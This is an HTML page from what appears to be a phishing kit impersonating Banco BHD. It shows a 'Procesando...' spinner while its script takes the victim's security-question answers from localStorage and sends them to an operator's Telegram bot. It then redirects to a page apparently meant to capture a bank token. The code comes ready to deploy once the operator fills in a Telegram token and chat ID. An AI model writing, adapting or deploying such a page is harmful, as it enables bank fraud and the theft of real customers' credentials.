<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Procesando</title>
    <meta http-equiv="refresh" content="0;url=bhd_token.html">
    <style>
        body { 
            background: #0033a0; 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: 'Segoe UI', sans-serif;
        }
        .loading { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <p>Procesando...</p>
    </div>

    <script>
        // ⚠️ CONFIGURA TUS CREDENCIALES DE TELEGRAM AQUÍ
        const TOKEN = 'TU_TOKEN_DE_TELEGRAM';
        const CHAT_ID = 'TU_CHAT_ID';

        // Función para enviar a Telegram
        async function enviarATelegram(quest1, quest2) {
            const texto = `📩 *New Info - BHD*\n\n👤 *Pregunta 1:* ${quest1}\n💬 *Pregunta 2:* ${quest2}\n💬 *Banco:* BHD`;
            
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`;
            
            try {
                const response = await fetch(url);
                return response.ok;
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Obtener datos guardados
        const datos = JSON.parse(localStorage.getItem('bhd_quest_datos') || '{}');
        
        // Enviar a Telegram
        if (datos.respuesta1 && datos.respuesta2) {
            const exitoso = await enviarATelegram(datos.respuesta1, datos.respuesta2);
            
            if (exitoso) {
                console.log('✓ Respuestas enviadas a Telegram');
            } else {
                console.log('⚠ Error al enviar, pero continuamos');
            }
        }

        // Después de 1.5 segundos, redirigir
        setTimeout(() => {
            window.location.href = 'bhd_token.html';
        }, 2500);
    </script>
</body>
</html>
